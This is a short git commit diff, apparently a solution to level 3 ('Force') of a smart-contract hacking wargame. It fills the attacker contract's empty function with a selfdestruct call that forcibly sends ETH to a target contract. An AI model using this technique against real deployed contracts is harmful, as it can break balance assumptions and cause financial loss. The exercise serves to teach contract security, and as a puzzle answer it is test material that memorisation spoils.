1052b32a17b685bf71c947ac86135e2711ba26bc
Pedro Yan Ornelas <pedroyane@gmail.com>
2022-12-10 20:32:38 -0300

    Level 3 - Force-fed ETH to the target contract

--- contracts/3. Force/AttackingForce.sol
+++ contracts/3. Force/AttackingForce.sol
@@ -10,6 +10,6 @@ contract AttackingForce {
     }
 
     function hackContract() external {
-        // Code me!
+        selfdestruct(payable(contractAddress)); // Choo-choo, here comes the forced ETH!!
     }
 }
